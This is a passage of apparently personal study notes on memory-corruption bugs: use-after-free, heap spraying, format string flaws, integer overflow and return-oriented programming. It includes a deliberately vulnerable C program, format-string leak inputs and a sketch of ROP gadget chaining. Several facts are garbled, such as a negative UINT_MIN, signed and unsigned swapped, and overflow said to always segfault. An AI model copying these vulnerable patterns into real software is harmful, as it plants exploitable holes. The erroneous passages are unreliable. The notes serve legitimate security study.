        -   When a memory block is dynamically allocated (e.g. using malloc()), the memory allocation routine will try to find an empty memory block in the heap (or extend the heap if there isn't any), generate a memory chunk metadata block that is part of a memory chunk linked list to reflect that the memory location is now allocated/in use, then return the pointer to the newly created memory chunk. When that pointer is deallocated, the memory chunk is updated/merged accordingly to reflect that the block is now free to be allocated again. However, this does not guarantee the clearing of data, nor, since the now-deallocated pointer is not actually nullify, that the previously allocated memory cannot be referenced again using the same pointer

        -   ## What is a dangling pointer?

            -   A pointer pointing to a memory location that has been deleted (or freed) is called dangling pointer

            -   Dangling pointers arise during object destruction, when an object that has an incoming reference is deleted or deallocated, without modifying the value of the pointer, so that the pointer still points to the memory location of the deallocated memory.

            -   The system may reallocate the previously freed memory, unpredictable behavior may result as the memory may now contain completely different data.

        -   ## The use of dangling pointers can result in a number of different types of problems, including:

            -   Unpredictable behavior if the memory is accessed

            -   Segmentation faults when the memory is no longer accessible

            -   Potential security risks

        -   ### Prevent dangling pointers

            -   int main(){

            -    int \*ptr = (int \*)malloc(sizeof(int));   

            -       // After below free call, ptr becomes a  dangling pointer

            -   free(ptr);    

            -    ptr = NULL; // No more a dangling pointer

            -   }

        -   ### Potential consequences of UAF exploitation include:

            -   Data corruption,

            -   Program crashes,

            -   Arbitrary code execution.

    -   ## Heap Spray

        -   The heap is vulnerable to this kind of attack because it usually starts at a predetermined location in memory.

        -   The goal of the attack is to ensure that the bytes can be accessed later as the vector of a separate attack. Later, the malicious software can use a pointer reference to execute the arbitrary code. If the heap is sprayed all over with the code to be executed, the chances that the pointer references the code is very high. Therefore, the heap spray is not actually an exploit, but a way to give other exploits a higher chance of success.

        -   Spraying the heap has nothing to do with heap exploitation nor with bypassing any exploit mitigation technique rather it is a payload delivery method. Mostly you will need this technique when exploiting browsers (also flash, PDF\'s and MS Office). With buffer overflows we always rely on the fact that we can allocate memory on the stack (or heap) and write shellcode to it.

        -   Basically, an attacker writes some bites (shellcode) to the heap in memory , then exploits a different vulnerability to cause the exploit to call the commands in the heap memory.

    -   ## Resources

        -   http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/17/10\_lecture.pdf

        -   <https://blog.lao-yuan.com/resource/books/heap-exploitation.pdf>

        -   <https://sourceware.org/glibc/wiki/MallocInternals>

        -   <https://tc.gts3.org/cs6265/2019/tut/tut09-02-advheap.html>

        -   <https://www.sans.edu/student-files/presentations/heap_overflows_notes.pdf>

        -   <http://etutorials.org/Networking/network+security+assessment/Chapter+13.+Application-Level+Risks/13.5+Heap+Overflows/>

        -   https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

-   #Format String Vulnerability

    -   ## What is a Format function?

        -   The Format Function is an ANSI C conversion function, like printf, fprintf, that takes a variable number of arguments, from which one is the so called format string. While the function evaluates the format string, it accesses the extra parameters given to the function. It is a conversion function, which is used to represent primitive C data types in a human readable string representation. They are used in nearly any C program, to output information, print error messages or process strings..

            -   fprintf = prints to a FILE stream

            -   printf = prints to the 'stdout' stream

            -   sprintf = prints into a string

            -   snprintf = prints into a string with length checking

            -   vfprintf = print to a FILE stream from a va\_arg structure

            -   vprintf = prints to 'stdout' from a va\_arg structure

            -   vsprintf = prints to a string from a va\_arg structure

            -   vsnprintf = prints to a string with length checking from a va\_arg structure

    -   ## What is a Format String?

        -   The Format String is the argument of the Format Function A format string is an ASCIIZ string that contains text and format parameters.

        -   Example:

            -   printf (\"The magic number is: %d\\n\", 1911);

        -   The text to be printed is "The magic number is:", followed by a format parameter '%d', that is replaced with the parameter (1911) in the output. Therefore the output looks like: The magic number is: 1911. parameters, like: printf ("The magic number is: %d\\n", 1911);

    -   ## What is a format specifier?

        -   The Format String Parameter, like %x %s defines the type of conversion of the format function.

        -   Ex of FORMAT SPECIFIERS: Different format specifiers indicate what type of data it should be replaced with:

            -   **%d** is for signed integers in decimal,

            -   **%u** is for unsigned integer in decimal,

            -   **%x** is for unsigned integer in hex,

            -    **%s** indicates that the data should be a pointer to a string.

        -   To insert values into an output string, you use format specifiers as placeholders in the string and pass the values as additional parameters to the printf function, for example:

            -   char\* dir\_name = \"Work\";

            -   int no\_of\_files = 42;

            -   printf(\"Directory %s contains %d files\", dir\_name, no\_of\_files);

        -   In this example, %s is a string format specifier and is replaced by the value of the first variable (dir\_name). %d means a decimal and is replaced by the value of second variable (no\_of\_files). So in this case, printf() prints:

            -   Directory Work contains 42 files

    -   ## Vulnerable code vs safe code

        -   **C code**

            -   \#include \<stdio.h\>

            -   void main(int argc, char \*\*argv){

            -   // This line is safe

            -   printf(\"%s\\n\", argv\[1\]);

            -   // This line is vulnerable

            -   printf(argv\[1\]);}

        -   **Safe Code**

            -   The line printf(\"%s\", argv\[1\]); in the example is safe, if you compile the program and run it:

            -   ./example \"Hello World %s%s%s%s%s%s\"

            -   The printf in the first line will not interpret the "%s%s%s%s%s%s" in the input string, and the output will be: "Hello World %s%s%s%s%s%s"

        -   **Vulnerable Code**

            -   The line printf(argv\[1\]); in the example is vulnerable, if you compile the program and run it:

            -   ./example \"Hello World %s%s%s%s%s%s\"

            -   The printf in the second line will interpret the %s%s%s%s%s%s in the input string as a reference to string pointers, so it will try to interpret every %s as a pointer to a string

    -   ## Exploiting Format string vulnerability

        -   Example :

            -   char\* user\_input = \"Hello World\";

            -   printf(user\_input);

        -   As long as user\_input is guaranteed to contain no format specifiers, this is fine. But if that value is controlled by the user, an attacker can exploit format string syntax to trigger a variety of dangerous behaviors. Let's start with a string that contains no text but lots of format specifiers, in this case %x for hexadecimal values:

            -   printf(\"%x%x%x%x\");

        -   For each format specifier it encounters in the format string, printf() expects to find a suitable variable in its argument list. In C programs, variables are stored on the stack in process memory, so when printf() sees the first %x specifier, it just looks at the stack and reads the first variable after the format string. This is repeated for all four %x specifiers, so the example above will print the hex representation of four values from the stack. Depending on the program and the execution context, these could include function return addresses, variable values, pointer memory addresses, function parameters, or even user-supplied data.

        -   Example : printf(\"%x%x%x%x%x\"); It will simply grab whatever data is on the stack and print it in hex format. This may include stack and return addresses, stack cookies (a security mechanism that aims to prevent buffer overflow exploitation), the content of variables and function parameters, and everything else that is immensely useful for an attacker

        -   An attacker can also use this to get information, not just crash the software. For example, running:

            -   ./example \"Hello World %p %p %p %p %p %p\"

        -   Will print the lines:

            -   Hello World %p %p %p %p %p %p

            -   Hello World 000E133E 000E133E 0057F000 CCCCCCCC CCCCCCCC CCCCCCCC

        -   The first line is printed from the non-vulnerable version of printf, and the second line from the vulnerable line. The values printed after the "Hello World" text, are the values on the stack of my computer at the moment of running this example.

        -   From here it gets worse. You can then provide an address to anywhere in the memory and read data with %s. Additionally, if %n is enabled, you can write arbitrary data anywhere in the memory, (%n parameter),

        -   The only one that writes to a variable? Combined with other format function specifiers, it can be used by attackers to overwrite specific memory locations, for example to redirect function pointers to a shellcode or simply cause a segmentation fault to crash an application for a denial of service attack. 

    -   ## The impact of Format string vulnerability

        -   Crash of the program

        -   Viewing the stack

        -   Viewing memory at any location

        -   Overwriting of arbitrary memory

    -   ## Resources

        -   <https://resources.infosecinstitute.com/format-string-bug-exploration/>

-   # Integer Overflow :

    -   ## What is an integer?

        -   An integer in computing is a variable holding a real number without fractions. The size of int is depending on the architecture. So on i386 arch (32-bit) the int is 32-bits. An integer is represented in memory in binary.

        -   Most programming languages have the concept of signed and unsigned integers. A signed integer (as the name suggests) has a sign, allowing it to store both positive and negative values. An unsigned variable, on the other hand, can only store positive numbers. to represent negative numbers using only binary. The way this is accomplished is by using the most significant bit (MSB) of a variable to determine the sign: if the MSB is set to 1, the variable is interpreted as negative; if it is set to 0, the variable is positive. This can cause some confusion, as will be explained in the section on signedness bugs, because not all variables are signed, meaning they do not all use the MSB to determine whether they are positive or negative. These variable are known as unsigned and can only be assigned positive values, whereas variables which can be either positive or negative are called unsigned.

    -   ## What is An integer overflow/ underflow?

        -   ### Integer Overflow:

            -   Since an integer is a fixed size Basically an integer is a region in memory capable of holding values with size up to four bytes (32bits) there is a fixed maximum value it can store. When this value can be controlled and an attempt is made to store a value greater than this maximum value it is known as an integer overflow.

            -   So according in C the maximum size of a signed int is INT\_MAX = 2147483647, (a signed integer between −2,147,483,648 and 2,147,483,647). The maximum size of an unsigned int is UINT\_MAX = 4294967295 (0xffffffff), (32 bits: maximum representable value 232 − 1 = 4,294,967,295) if a value is larger than the INT\_MAX is used it will trigger a segmentation fault.

        -   ### Integer Underflow:

            -   Integer overflows occur when a value exceeds the maximum value that a variable can contain, and integer underflows happen when a value becomes too small to fit. When this occurs, the value wraps around from the minimum value that can be stored to the maximum.

            -   For example, consider an unsigned variable with a current value of zero. Subtracting one from this value should result in a value of negative one; however, unsigned variables can't store negative numbers. The result is an unsigned variable that contains the maximum value that it can hold.. This is called an underflow and will also trigger a segmentation fault.

            -   Because the binary unsigned int -4294967295 is similar to the binary representation of the signed int -1 in memory

            -   INT\_MIN = -2147483647-1

            -   UINT\_MIN = -4294967295

    -   ## Vulnerable program int.c

        -   \#include \<stdio.h\>

        -   int main(int argc, char \*argv\[\]) {

        -   char buf\[20\];

        -   int i=atoi(argv\[1\]); memcpy(buf,argv\[2\],i\*sizeof(int));

        -   printf(\"the number is %d=%d\\n\",i,i\*sizeof(int)); printf(\"the buffer is:%s\\n\",buf);

        -   }

    -   ## How Integer Overflows Happen ?

        -   In most programming languages, integer values are usually allocated a certain number of bits in memory. For example, space reserved for a 32-bit integer data type may store an unsigned integer between 0 and 4,294,967,295 or a signed integer between −2,147,483,648 and 2,147,483,647. In the case of signed integers, the most significant (first) bit usually signifies whether the integer is a positive value or a negative value.

        -   However, what happens when you perform the calculation *4,294,967,295 + 1* and attempt to store the result that is greater than the maximum value for the integer type? It depends completely on the language and the compiler. And, unfortunately, [[most languages and most compilers raise no error at all]{.underline}] and simply perform a modulo operation, wraparound, or truncation, or they have other undefined behavior. For the above example, the result is most often 0.

        -   An *integer overflow* occurs when you attempt to store inside an integer variable a value that is larger than the maximum value the variable can hold which is a type of memory corruption vulnerability

    -   ## Security Impact of Integer Operations 

        -   Attackers can use these conditions to influence the value of variables in ways that the programmer did not intend. The security impact depends on the actions taken based on those variables. Examples include, but are certainly not limited, to the following:

        -   An integer overflow during a buffer length calculation can result in allocating a buffer that is too small to hold the data to be copied into it. A buffer overflow can result when the data is copied.

        -   When calculating a purchase order total, an integer overflow could allow the total to shift from a positive value to a negative one. This would, in effect, give money to the customer in addition to their purchases, when the transaction is completed.

        -   Withdrawing 1 dollar from an account with a balance of 0 could cause an integer underflow and yield a new balance of 4,294,967,295.

        -   A very large positive number in a bank transfer could be cast as a signed integer by a back-end system. In such case, the interpreted value could become a negative number and reverse the flow of money - from a victim\'s account into the attacker\'s.

-   # Return Oriented programing

    -   ROP stands for Return Oriented Programming and this is a concept that was originally part of Linux exploitation in a technique known as return to libc. Essentially what it\'s about is using code that already exists in the program you\'re exploiting to perform certain key functions for you.

    -   Now the way we use ROP primarily is as a bypass for DEP, or data execution prevention, which we\'ve talked about in one of the previous mitigation videos. What we do is we use return oriented programming to call Windows API functions to mark the stack as executable. So we discussed before how DEP prevents execution on the stack by not allowing non-executable memory to be treated as instructions. So what you do is you use ROP gadgets in order to call one of a couple different Windows functions, usually something like virtual protect and tell it to mark the stack as having execute permission. So then DEP is no longer in your way and you can execute your shell code here.

    -   ## Gadgets

        -   are a small group of instructions ending with a x86 RET instruction. For example, mov eax, 10 ; ret is a gadget which allows us to set eax to 10 (decimal). These gadgets can be chained together to make them work as a simple unit to perform arbitray computations. For example, we can chain three gadgets together to perform addition on them:

            -       pop eax; ret

            -       pop ebx ret;

            -       add eax, ebx; ret

        -   The following chain of gadgets allows us to set two processor registers and them perform arithmetic addition on them:

        -   ROP is not limited to only calculations. We can also perform code branching and check for conditions (equal, less and greater ) on the given data


  